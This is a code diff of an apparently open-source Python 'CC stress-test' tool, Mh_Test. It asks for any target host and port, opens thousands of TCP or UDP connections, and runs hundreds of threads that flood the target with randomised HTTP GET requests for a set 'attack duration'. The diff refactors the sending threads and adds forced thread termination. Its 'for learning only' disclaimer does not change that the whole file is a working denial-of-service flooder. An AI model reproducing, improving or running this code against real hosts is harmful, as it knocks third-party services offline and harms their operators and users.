@@ -1,8 +1,8 @@
-import socket,sys,time,os
+import socket,sys,time,os,ctypes
 import threading as th
 from random import choice,randint
 from tqdm import tqdm
-version,m1='b0.0.2b','(c)Copyrighgt 2025 _MhwsChina_'
+version,m1='b0.0.2c','(c)Copyrighgt 2025-2026 _MhwsChina_'
 useragents=[
     'Java/21.0.3',
     'Python-urllib/2.5',
@@ -30,8 +30,6 @@ accepts=[
 ]
 lock,lock1=th.RLock(),th.RLock()
 clients=[]
-closed_conn=[]
-cindex=0
 qs,qe=0,0
 def fmnum(num):
     tmp,tmp1=0,0
@@ -53,7 +51,7 @@ def getln(txt,typ=str,n=None,ls=[],err='输入不正确,请重新输入!'):
         try:tmp=typ(tmp);break
         except:print(err)
     return tmp
-def print(*args,end=''):
+def print(*args,end='\n'):
     txt=' '.join(map(str,[*args]))
     l=0
     for i in txt:
@@ -62,9 +60,6 @@ def print(*args,end=''):
     try:txt=txt+(os.get_terminal_size().columns-l)*' '
     except:txt+='\n'
     sys.stdout.write(txt+end)
-def log(txt,mode='INFO',end='',start=''):
-    t=time.strftime('%H:%M:%S',time.localtime(time.time()))
-    print(f'{start}[{t} {mode}]: {txt}',end=end)
 def getreq():
     useragent='User-Agent: '+choice(useragents)+'\r\n'
     accept=choice(accepts)
@@ -73,69 +68,56 @@ def getreq():
     connection='Connection: Keep-Alive\r\n'
     get_host='GET'+' '+page+' HTTP/1.1\r\nHost: '+ip+'\r\n'
     req=get_host+useragent+accept+forward+connection+'\r\n'
-    req=bytes(req,encoding='gbk')
-    return req
-class mht_TCPdefault(th.Thread):
-    def __init__(self):
-        th.Thread.__init__(self)
-    def run(self):
-        global clients,cindex,qs,qe
-        c=th.current_thread().name
-        req=getreq()
-        while 1:
-            lock.acquire()
-            if cindex>=len(clients):cindex=0
-            tmpa=cindex
-            client=clients[tmpa]
-            cindex+=1
-            lock.release()
-            try:
-                for tmp in range(cnt):
-                    client.send(req)
-                    qs+=1
-            except Exception as ad:
-                qe+=1
-                if debug:log(f'[-] @ {c} '+str(ad),mode='ERROR')
-                clients[tmpa]=create_tcp_client()
-class mht_UDPdefault(th.Thread):
-    def __init__(self):
-        th.Thread.__init__(self)
-    def run(self):
-        global clients,cindex,qs,qe
-        c=th.current_thread().name
-        req=getreq()
-        while 1:
-            lock.acquire()
-            if cindex>=len(clients):cindex=0
-            tmpa=cindex
-            client=clients[tmpa]
-            cindex+=1
-            lock.release()
-            try:
-                for tmp in range(cnt):
-                    client.sendto(req,(ip,port))
-                    qs+=1
-            except Exception as ad:
-                qe+=1
-                if debug:log(f'[-] @ {c} '+str(ad),mode='ERROR')
-                clients[tmpa]=create_udp_client()
+    return bytes(req,encoding='gbk')
+def mht_TCPdefault():
+    global clients,qs,qe
+    c,c1=th.current_thread().name,0
+    req=getreq()
+    while 1:
+        try:
+            with lock:client=clients.pop()
+            for j in range(cntt):
+                client.sendall(req);qs+=1
+            c1+=1
+            if c1==10:print(f'\r[+] SENT @ {c}',end='\033[K');c1=0
+        except RuntimeError:return
+        except Exception as ad:
+            print(f'\r[-] {ad} @ {c}',end='\033[K'+('\n' if debug else ''))
+            qe+=1;client=create_tcp_client()
+        try:clients.append(client)
+        except:return
+def mht_UDPdefault():
+    global clients,qs,qe
+    c,c1=th.current_thread().name,0
+    req=getreq()
+    while 1:
+        try:
+            with lock:client=clients.pop()
+            for j in range(cntt):
+                client.sendto(req,(ip,port));qs+=1
+            c1+=1
+            if c1==10:print(f'\r[+] SENT @ {c}',end='\033[K');c1=0
+        except RuntimeError:return
+        except Exception as ad:
+            print(f'\r[-] ERROR @ {c} {ad}',end='\033[K'+('\n' if debug else ''))
+            qe+=1;client=create_udp_client()
+        try:clients.append(client)
+        except:return
 def create_tcp_client():
     ip1=ip.split('/')[0]
-    while 1:
-        try:
-            temp_client=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            #端口复用,防止报错
-            temp_client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            temp_client.connect((ip1,port))
-            return temp_client
-        except:pass
+    try:
+        temp_client=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        #端口复用,防止报错
+        temp_client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        temp_client.connect((ip1,port))
+        return temp_client
+    except:return create_tcp_client()
 def create_udp_client():
-    while 1:
-        try:
-            temp_client=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            temp_client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            return temp_client
-        except:pass
+    try:
+        temp_client=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        temp_client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        return temp_client
+    except:return create_udp_client()
 def sclient():
     global cns
     while cns:
@@ -144,11 +126,14 @@ def sclient():
         if udp:clients.append(create_udp_client())
         else:clients.append(create_tcp_client())
         cbar.update(1)
-log(' * Mh_Test '+version)
-log(' * Code:   https://github.com/MhwsChina/Mh_Test')
-log(' * Auther: _MhwsChina_')
-log(' * Text:   cc压力测试工具，请勿用于非法用途，仅供学习参考',mode='WARN')
-log(' * Text:   使用该工具产生的后果作者概不负责',mode='WARN')
+def killthread(target,rtype=RuntimeError):
+    tid=ctypes.c_long(target.ident)
+    return ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, ctypes.py_object(rtype))
+print(' * Mh_Test '+version)
+print(' * Code:   https://github.com/MhwsChina/Mh_Test')
+print(' * Auther: _MhwsChina_')
+print(' * Text:   cc压力测试工具，请勿用于非法用途，仅供学习参考')
+print(' * Text:   使用该工具产生的后果作者概不负责')
 ip=getln('IP/网址:').replace('http://','').replace('https://','')
 page=ip.split('/')
 page='/' if len(page)==1 else '/'+'/'.join(page[1:])
@@ -158,54 +143,54 @@ if ':' in ip:
     port=int(port)
 else:
     port=getln('PORT/端口:',int,80)
-cn=getln('CONNECT/连接数(10000):',int,10000)
-thread=getln('THREAD/发包线程(1000):',int,1000)
-cnt=getln('威力[(10=普通)(50=高)(100=极高)]:',int,100)
+cn=getln('CONNECT/连接数(1000):',int,1000)
+thread=getln('THREAD/发包线程(800):',int,800)
+cntt=getln('威力[(50=普通)(100=高)(500=极高)]:',int,200)
 tm=getln('TIME/攻击持续时间:',int,60)
 udp=1 if getln('是否使用UDP连接(Y/[n])',str,'n',['Y','y','N','n']).lower()=='y' else 0
-log('创建连接')
+print('创建连接')
 cbar=tqdm(total=cn,ascii=True,dynamic_ncols=True)
-if thread>cn:thread=cn
 cns=list(range(cn))
 t=[]
 for i in range(thread):
-    try:
-        t1=th.Thread(target=sclient,name='create')
-        t1.start()
-        t.append(t1)
-    except:pass
+    t1=th.Thread(target=sclient,name='create')
+    t1.start()
+    t.append(t1)
 for t1 in t:t1.join()
 cbar.close()
-log(f'创建了{len(clients)}条连接')
-lock.acquire()
-log('启动线程')
+print(f'创建了{len(clients)}条连接')
+#debug=1 if getln('DEBUG MODE?(Y/[n])',str,'n',['Y','n'])=='Y' else 0
+debug=0
+print(f'TARGET={ip}:{port},MODE={"udp" if udp else "tcp"}')
+lock.acquire();print('启动线程')
+t,qss=[],0
 for i in range(thread):
     try:
-        if udp:mht_UDPdefault().start()
-        else:mht_TCPdefault().start()
+        if udp:t2=mht_UDPdefault
+        else:t2=mht_TCPdefault
+        t3=th.Thread(target=t2,name=f'attackThread-{i}');t3.start();t.append(t3)
     except:pass
-log('加载完毕')
-debug=1 if getln('DEBUG MODE?(Y/[n])',str,'n',['Y','n'])=='Y' else 0
-log(f'TARGET={ip}:{port},MODE={"udp" if udp else "tcp"}')
-input('按下Enter开始压测')
-lock.release()
-qss=0
-bar=tqdm(range(tm),ascii=True,dynamic_ncols=True,mininterval=0.00000000001)
-for i in bar:
-    time.sleep(1)
-    bar.set_postfix(send=fmnum(qs),client=fmnum(len(clients)))
-    qss+=qs
-    qs=0
-log('等待线程停止')
-lock.acquire()
-log('关闭连接')
-clients.clear()
-log('清空连接')
-while clients:
-    clients.clear()
-    time.sleep(1)
-bar.close()
-log('压测完成')
-log(f'压测总时长:{tm},请求数:{fmnum(qss)},线程数:{fmnum(thread)},连接数:{fmnum(cn)},请求错误次数:{fmnum(qe)}')
+input('按下Enter开始压测');lock.release()
+t1=t2=time.time()
+while t2-t1<tm:
+    try:
+        time.sleep(1)
+        t2=time.time()
+        print('\rsecond',int(t2-t1),'send=',fmnum(qs),'err=',fmnum(qe),'\033[K')
+        qss+=qs;qs=0
+    except:print('\r提前退出!\033[K');break
+print('\r正在清空连接\033[K')
+with lock:
+    for i in clients:
+        try:i.close()
+        except:pass
+    create_tcp_client=create_udp_client=lambda:None
+    del clients,qs,lock
+print('\r正在强制关闭线程并等待线程停止\033[K')
+while t:
+    print(f'\r剩余线程:{len(t)}',end='\033[K')
+    killthread(t.pop())
+print('\n压测完成')
+print(f'压测总时长:{int(t2-t1)}s,请求数:{fmnum(qss)},线程数:{fmnum(thread)},连接数:{fmnum(cn)},请求错误次数:{fmnum(qe)}')
 input('按Enter键退出...')
 os._exit(0)
